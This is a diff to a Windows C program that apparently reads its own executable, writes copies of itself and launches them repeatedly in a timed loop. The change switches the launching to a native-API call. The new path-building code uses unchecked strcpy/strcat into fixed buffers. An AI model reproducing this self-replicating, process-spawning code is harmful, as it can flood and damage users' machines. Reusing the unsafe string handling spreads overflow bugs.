@@ -12,42 +12,31 @@
 int myEXESize = 0;
 UINT8* myFileBuffer = 0;
 
+char currentDIR[256] = { 0 };
 char nextEXEName[256] = { 0 };
+char nextEXE_NTPath[256] = { 0 };
 
 void PopCtl();
+void create_process(char *ascii_path);
 
 void create_proc_worker()
 {
-    // work around for something like NtRaiseHardError in stupid kernel32.dll
-    // consider NtCreateUserProcess in the future
-    STARTUPINFOA si = {0};
-    PROCESS_INFORMATION pi = {0};
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_SHOWNORMAL;
-    BOOL ok = CreateProcessA(
-        nextEXEName,   // lpApplicationName
-        NULL,          // lpCommandLine
-        NULL,          // lpProcessAttributes
-        NULL,          // lpThreadAttributes
-        FALSE,         // bInheritHandles
-        CREATE_NEW_CONSOLE, // dwCreationFlags
-        NULL,          // lpEnvironment
-        NULL,          // lpCurrentDirectory
-        &si,
-        &pi
-    );
-    if (!ok) {
-        DWORD err = GetLastError();
-        printf("Oh no! %s launch failed: %d\n", nextEXEName, err);
-    } else {
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-    }
+    strcpy(nextEXE_NTPath, currentDIR);
+    strcat(nextEXE_NTPath, nextEXEName);
+    create_process(nextEXE_NTPath);
 }
 
 int main(int argc, char** argv)
 {
+    UINT8 n = sprintf(currentDIR, "\\??\\%s", argv[0]);
+    for (int i = n - 1; i >= 0; i--)
+    {
+        if (currentDIR[i] == '\\')
+        {
+            currentDIR[i + 1] = 0;
+            break;
+        }
+    }
     CreateThread(0, 0, (LPTHREAD_START_ROUTINE)PopCtl, 0, 0, 0);
     FILE* fp = fopen(argv[0], "rb");
     fseek(fp, 0, SEEK_END);
@@ -70,8 +59,6 @@ int main(int argc, char** argv)
         Sleep(GapTime); // Delay is important here to avoid producing so fast
         fclose(fp); fp = NULL; // unlock the file
 
-        //ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
-        HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)create_proc_worker, 0, 0, 0);
-        WaitForSingleObject(hThread, GapTime);
+        create_proc_worker();
     }
 }
